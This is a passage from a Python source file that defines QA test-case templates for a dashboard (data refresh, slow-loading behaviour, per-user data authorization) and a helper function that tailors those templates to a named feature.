        {
            "id": "TC-003",
            "title": "Dashboard refresh updates data",
            "description": "Data should refresh without full page reload",
            "category": "happy_path",
            "priority": "medium",
            "preconditions": ["User is logged in", "Dashboard is loaded"],
            "steps": [
                "1. Note current values in a widget",
                "2. In another tab, create new data that should appear",
                "3. Click refresh icon or wait for auto-refresh",
                "4. Check if new data appears"
            ],
            "expected_result": "New data appears after refresh. Page doesn't fully reload. Loading state shown briefly during refresh.",
            "test_data": {}
        },
        {
            "id": "TC-004",
            "title": "Dashboard handles slow loading gracefully",
            "description": "Slow API responses shouldn't break the UI",
            "category": "error_handling",
            "priority": "medium",
            "preconditions": ["User is logged in", "API is slow (throttled to 5s response)"],
            "steps": [
                "1. Navigate to dashboard",
                "2. Observe loading behavior"
            ],
            "expected_result": "Skeleton loaders or spinners shown for each widget. Layout doesn't jump when data loads. Widgets load independently.",
            "test_data": {}
        },
        {
            "id": "TC-005",
            "title": "Dashboard shows only authorized data",
            "description": "Users should only see their own data",
            "category": "security",
            "priority": "critical",
            "preconditions": [
                "Two users exist: user1@test.com and user2@test.com",
                "Each has different data"
            ],
            "steps": [
                "1. Login as user1@test.com",
                "2. Note the dashboard data",
                "3. Logout and login as user2@test.com",
                "4. Compare dashboard data"
            ],
            "expected_result": "Each user sees ONLY their own data. No cross-user data leakage. User IDs in API calls match logged-in user.",
            "test_data": {
                "user1": "user1@test.com",
                "user2": "user2@test.com"
            }
        },
    ],
}


def get_template_tests(page_type: str, feature: str) -> List[Dict]:
    """Get human-quality template tests for a page type."""
    templates = HUMAN_QUALITY_TEMPLATES.get(page_type.lower(), [])

    # Customize for the feature
    customized = []
    for template in templates:
        test = template.copy()
        # Add feature name to title if not already present
        if feature.lower() not in test["title"].lower():
            test["title"] = f"{feature}: {test['title']}"
        customized.append(test)

    return customized
